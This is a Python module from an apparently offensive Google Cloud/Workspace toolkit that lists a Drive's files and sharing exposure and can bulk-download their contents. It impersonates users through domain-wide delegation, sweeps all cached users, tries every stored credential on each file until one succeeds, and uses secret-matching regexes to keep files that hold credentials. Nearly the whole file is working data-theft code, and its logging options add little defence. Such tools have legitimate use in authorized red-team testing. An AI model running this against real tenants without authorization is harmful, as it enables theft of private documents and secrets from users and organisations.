"""enum_drive: enumerate a Google Drive's files + sharing (ACL) exposure, and
optionally download file *content* (a modern, logged take on GD-Thief).

Drive is a *per-user* data plane: you read one user's Drive at a time. With a
service-account credential this means domain-wide delegation impersonating the
target user (``--caller-email``); ``--all-users`` sweeps every cached
``workspace_users`` row. With a plain user OAuth credential you simply read that
user's own Drive.

For each file it records metadata + an exposure label (public / anyone_with_link /
external / domain / private) to ``workspace_drive_files`` and every ACL entry to
``workspace_drive_permissions``.

Downloading (opt-in):
  * ``--download-public`` -> download ONLY public / anyone-with-link files (readable
                             by any identity, so they pull without special access)
  * ``--download``        -> download every listed candidate file

Download tiers (with ``--download``):
  * default               -> download every candidate
  * ``--focused``         -> only files with interesting extensions/types (by NAME)
  * ``--secret-regex [P]``-> download, scan CONTENT, keep only files that hit a secret
                             pattern (no value = built-in set; values = built-ins + yours)

Download filters: ``--only-external`` / ``--exposure`` / ``--owner`` / ``--limit``.

Download identity (Google has NO raw email/password auth -- a "user" credential is one
you loaded with `creds add --type oauth2 --token-file token.json` / `--token`):
  * default                    -> download AS the identity you listed under (your
                                  current user, or the ``--caller-email`` user via DWD)
  * ``--downloader-cred NAME`` -> download AS one stored credential
  * ``--downloader-creds-all`` -> for each file, TRY every stored credential until one
                                  can download it (report which one worked)

Blue-team note: every download emits a greppable ``[DOWNLOAD]`` log line and
``--throttle`` paces requests so the Drive audit-log pattern is easy to spot.

Needs the Drive scope ``https://www.googleapis.com/auth/drive.readonly`` on the
credential/DWD grant, and the Drive API enabled in the credential's GCP project.
"""

from __future__ import annotations

import time

from gcpwn.core.console import UtilityTools
from gcpwn.core.output_paths import compact_filename_component
from gcpwn.core.utils.module_helpers import normalize_str_set
from gcpwn.core.utils.service_runtime import parse_component_args
from gcpwn.modules.workspace.apps.drive.utilities.drive_helpers import (
    DriveResource,
    classify_exposure,
    compile_secret_patterns,
    is_interesting_file,
)
from gcpwn.modules.workspace.common import resolve_workspace_admin_subject

_PUBLIC = ("public", "anyone_with_link")
_EXTERNAL = ("public", "anyone_with_link", "external")
# In --downloader-creds-all mode, drop a credential after this many 403s with no success
# (it almost certainly lacks Drive access at all, vs. a per-file permission denial).
_DENY_DROP_THRESHOLD = 3


def _parse_args(user_args):
    def _add_extra_args(parser):
        # Listing target
        parser.add_argument("--caller-email", required=False, help="Read this user's Drive (SA domain-wide delegation subject)")
        parser.add_argument("--all-users", action="store_true", help="Read every cached workspace_users Drive (per-user DWD)")
        parser.add_argument("--query", required=False, help="Drive files.list `q` filter (e.g. \"mimeType!='application/vnd.google-apps.folder'\")")
        parser.add_argument("--max-files", type=int, default=0, help="Cap files enumerated per user (0 = all)")
        parser.add_argument("--impersonate", required=False, help="Workspace admin to impersonate when neither --caller-email nor --all-users is given")
        # Download switches
        parser.add_argument("--download", action="store_true", help="Download content of all listed candidate files")
        parser.add_argument("--download-public", action="store_true", help="Download content of ONLY public / anyone-with-link files")
        # Download candidate filters
        parser.add_argument("--only-external", action="store_true", help="Download filter: only files shared publicly or to external users")
        parser.add_argument("--exposure", required=False, help="Download filter: exact exposure (public|anyone_with_link|external|domain|private)")
        parser.add_argument("--owner", required=False, help="Download filter: only files owned by this email")
        parser.add_argument("--limit", type=int, default=0, help="Download filter: cap number of files downloaded (0 = no cap)")
        # Download tier
        parser.add_argument("--focused", action="store_true", help="Only download files with interesting extensions/types (by name)")
        parser.add_argument("--secret-regex", nargs="*", metavar="PATTERN", help="Download+scan CONTENT; keep only files matching a secret pattern (no value = built-in set)")
        # Downloader identity
        parser.add_argument("--downloader-cred", required=False, help="Download AS this stored credential; default = the identity you listed as")
        parser.add_argument("--downloader-creds-all", action="store_true", help="For each file, try EVERY stored credential until one can download it")
        # Blue-team pacing
        parser.add_argument("--throttle", type=float, default=0.0, help="Seconds to sleep between downloads (observable audit pattern)")

    return parse_component_args(
        user_args,
        description="Enumerate Google Drive files/sharing and optionally download content",
        components=[],
        add_extra_args=_add_extra_args,
        standard_args=("get", "debug"),
    )


def _org_domains(session) -> set[str]:
    """Domains considered 'internal' -- from workspace_domains, plus every cached
    user's email domain as a fallback. Used to flag externally-shared files."""
    domains: set[str] = set()
    for row in session.get_data("workspace_domains", columns=["domain_name"]) or []:
        value = str(row.get("domain_name") or "").strip().lower()
        if value:
            domains.add(value)
    for row in session.get_data("workspace_users", columns=["email"]) or []:
        email = str(row.get("email") or "").strip().lower()
        if "@" in email:
            domains.add(email.split("@")[-1])
    return domains


def _target_users(session, args) -> list[str]:
    if args.caller_email:
        return [str(args.caller_email).strip()]
    if args.all_users:
        rows = session.get_data("workspace_users", columns=["email"]) or []
        return sorted(normalize_str_set([r.get('email') for r in rows]))
    # No target user: read the active credential's own Drive (user OAuth token path).
    return [str(getattr(session, "email", "") or "").strip()]


def _is_exposed(file_row, org_domains) -> bool:
    exposure, _ = classify_exposure(file_row, org_domains=org_domains)
    return exposure in ("public", "anyone_with_link", "external")


def _list_phase(session, args, subject_override, org_domains) -> bool:
    """List target users' Drives into workspace_drive_files/permissions.

    Returns False only when there is nothing to enumerate (so the caller can bail).
    """
    users = _target_users(session, args)
    if args.all_users and not users:
        print(
            f"{UtilityTools.YELLOW}[*] No cached users. Run `modules run enum_cloud_identity` / directory user "
            f"enumeration first, or pass --caller-email user@domain.{UtilityTools.RESET}"
        )
        return False

    summary = []
    for user_email in users:
        # For an SA credential the impersonation subject is the target user (that's how
        # you read their Drive); for a user OAuth token with_subject is a no-op and we
        # read the token owner's own Drive regardless.
        subject = user_email or subject_override or None
        resource = DriveResource(session, subject=subject)
        files = resource.list_files(query=args.query, max_files=args.max_files)

        if resource.last_error_status == 403:
            # Scope/DWD denial or Drive API disabled is global -> stop the sweep; the
            # precise cause was already printed by handle_directory_error.
            remaining = len(users) - users.index(user_email) - 1
            if remaining:
                print(f"{UtilityTools.YELLOW}[*] Skipping {remaining} remaining user(s).{UtilityTools.RESET}")
            break

        caller_label = user_email or getattr(session, "email", "") or "self"
        resource.save(files, caller_email=caller_label, org_domains=org_domains)

        exposed = [f for f in files if _is_exposed(f, org_domains)]
        if files:
            print(
                f"[*] {caller_label}: {len(files)} file(s), "
                f"{UtilityTools.RED if exposed else UtilityTools.GREEN}{len(exposed)} externally/publicly exposed{UtilityTools.RESET}"
            )
        summary.append({"user": caller_label, "files": len(files), "exposed": len(exposed)})

    UtilityTools.summary_wrapup(
        session.project_id,
        "Google Drive Files",
        summary,
        ["user", "files", "exposed"],
        primary_resource="Drive",
        primary_sort_key="user",
    )
    return True


def _candidate_rows(session, args):
    """The set of files to download, from cached workspace_drive_files (filtered)."""
    rows = session.get_data("workspace_drive_files") or []
    exposure = str(args.exposure or "").strip().lower()
    owner = str(args.owner or "").strip().lower()
    # When a single target user is named, scope downloads to that user's files.
    caller = str(args.caller_email or "").strip().lower()
    only_public = bool(args.download_public)  # --download-public => only anyone/anyone-with-link
    out = []
    for row in rows:
        exp = str(row.get("exposure") or "").lower()
        if caller and str(row.get("caller_email") or "").lower() != caller:
            continue
        if only_public and exp not in _PUBLIC:
            continue
        if args.only_external and exp not in _EXTERNAL:
            continue
        if exposure and exp != exposure:
            continue
        if owner and str(row.get("owner_email") or "").lower() != owner:
            continue
        out.append(row)
    return out


def _all_downloader_crednames(session) -> list[str]:
    """Every stored credential name in the workspace (candidates for --downloader-creds-all)."""
    rows = session.data_master.list_creds(session.workspace_id) or []
    names: set[str] = set()
    for row in rows:  # sqlite3.Row -- index access, not .get()
        try:
            credname = str(row["credname"]).strip()
        except (KeyError, IndexError, TypeError):
            credname = ""
        if credname:
            names.add(credname)
    return sorted(names)


def _build_all_cred_pool(session) -> list[tuple[str, DriveResource]]:
    """Build a (credname, DriveResource) downloader for every stored credential."""
    pool: list[tuple[str, DriveResource]] = []
    for credname in _all_downloader_crednames(session):
        credentials, _email = session.build_stored_credentials(credname)
        if credentials is not None:
            pool.append((credname, DriveResource(session, subject=None, credentials=credentials)))
    return pool


def _download_phase(session, args, subject_override) -> None:
    rows = _candidate_rows(session, args)
    if not rows:
        print(
            f"{UtilityTools.YELLOW}[*] No candidate files to download. Enumerate first "
            f"(e.g. --caller-email user@domain / --all-users) or relax the download filters.{UtilityTools.RESET}"
        )
        return

    patterns = None
    if args.secret_regex is not None:
        patterns = compile_secret_patterns(extra=args.secret_regex or None)
        print(f"[*] Secret-scan mode: keeping only files whose CONTENT matches {len(patterns)} pattern(s).")

    mode_all = bool(getattr(args, "downloader_creds_all", False))
    fixed_cred = str(getattr(args, "downloader_cred", "") or "").strip()

    pool: list[tuple[str, DriveResource]] = []
    if mode_all:
        pool = _build_all_cred_pool(session)
        if not pool:
            print(f"{UtilityTools.YELLOW}[*] --downloader-creds-all: no usable stored credentials.{UtilityTools.RESET}")
            return
        print(f"[*] --downloader-creds-all: trying up to {len(pool)} stored credential(s) per file until one succeeds.")

    single_cache: dict[str, DriveResource] = {}  # fixed/default: label -> DriveResource
    dead: set[str] = set()      # downloader labels proven unusable (403, no success)
    success: set[str] = set()
    miss: dict[str, int] = {}
    downloaded = kept = skipped = 0
    summary = []

    for row in rows:
        if args.limit and downloaded >= args.limit:
            break
        raw = row.get("raw_json") if isinstance(row.get("raw_json"), dict) else row
        mime = str(row.get("mime_type") or (raw.get("mimeType") if isinstance(raw, dict) else "") or "")
        if args.focused and not is_interesting_file({"name": row.get("name"), "mimeType": mime}):
            skipped += 1
            continue

        caller = str(row.get("caller_email") or "").strip() or subject_override or ""
        file_id = str(row.get("file_id") or "")
        name = str(row.get("name") or file_id)

        # Assemble the ordered downloader candidates for THIS file.
        if mode_all:
            candidates = [(label, res) for label, res in pool if label not in dead]
            if not candidates:
                print(f"{UtilityTools.YELLOW}[*] All downloader credentials are denied; stopping.{UtilityTools.RESET}")
                break
        else:
            label = fixed_cred or caller or "self"
            if label in dead:
                if fixed_cred:
                    break  # the single fixed cred is denied -> nothing more to try
                skipped += 1  # this caller's identity is denied -> skip its files
                continue
            resource = single_cache.get(label)
            if resource is None:
                if fixed_cred:
                    credentials, _email = session.build_stored_credentials(fixed_cred)
                    if credentials is None:
                        print(f"{UtilityTools.RED}[X] Could not load --downloader-cred '{fixed_cred}'. Aborting downloads.{UtilityTools.RESET}")
                        break
                    resource = DriveResource(session, subject=None, credentials=credentials)
                else:
                    resource = DriveResource(session, subject=caller or None)
                single_cache[label] = resource
            candidates = [(label, resource)]

        # Try candidates until one returns content.
        content: bytes | None = None
        suffix = ""
        used = ""
        for label, resource in candidates:
            resource.last_error_status = None
            content, suffix = resource.download(file_id=file_id, mime_type=mime)
            if content is not None:
                used = label
                success.add(label)
                miss[label] = 0
                break
            if resource.last_error_status == 403:
                miss[label] = miss.get(label, 0) + 1
                if mode_all:
                    if label not in success and miss[label] >= _DENY_DROP_THRESHOLD:
                        dead.add(label)
                    continue  # try the next credential for this file
                dead.add(label)  # single/default downloader denied -> stop using it
                break
            # content is None and not a 403 -> folder / unsupported native type; no cred helps
            break

        if content is None:
            skipped += 1
            continue
        downloaded += 1

        matched = ""
        if patterns is not None:
            hit = _scan(content, patterns)
            if not hit:
                skipped += 1
                if args.throttle:
                    time.sleep(args.throttle)
                continue
            matched = hit

        dest = session.get_download_save_path(
            service_name="drive",
            filename=compact_filename_component(name + suffix),
            subdirs=[_safe(used or caller or "self")],
        )
        try:
            dest.write_bytes(content)
        except Exception as exc:
            print(f"{UtilityTools.RED}[X] Failed writing {dest}: {exc}{UtilityTools.RESET}")
            continue
        kept += 1

        exposure = str(row.get("exposure") or "")
        owner = str(row.get("owner_email") or "")
        secret_note = f" secret={matched}" if matched else ""
        print(
            f"[DOWNLOAD] downloader={used or 'self'} file='{name}' id={file_id} exposure={exposure} "
            f"owner={owner} bytes={len(content)}{secret_note} -> {dest}"
        )
        summary.append({"downloader": used or "self", "file": name, "exposure": exposure, "bytes": len(content)})

        if args.throttle:
            time.sleep(args.throttle)

    print(f"[*] Downloaded {downloaded} file(s); saved {kept}; skipped {skipped}.")
    UtilityTools.summary_wrapup(
        session.project_id,
        "Google Drive Downloads",
        summary,
        ["downloader", "file", "exposure", "bytes"],
        primary_resource="Drive Download",
        primary_sort_key="downloader",
    )


def run_module(user_args, session):
    args = _parse_args(user_args)
    subject_override = resolve_workspace_admin_subject(session, getattr(args, "impersonate", None))
    org_domains = _org_domains(session)

    if not _list_phase(session, args, subject_override, org_domains):
        return 1

    if getattr(args, "download", False) or getattr(args, "download_public", False):
        _download_phase(session, args, subject_override)
    return 1


def _scan(content: bytes, patterns) -> str:
    try:
        text = content.decode("utf-8", errors="replace")
    except Exception:
        return ""
    for pattern in patterns:
        if pattern.search(text):
            return pattern.pattern[:40]
    return ""


def _safe(value: str) -> str:
    return "".join(c if (c.isalnum() or c in "._@-") else "_" for c in str(value))[:80] or "self"
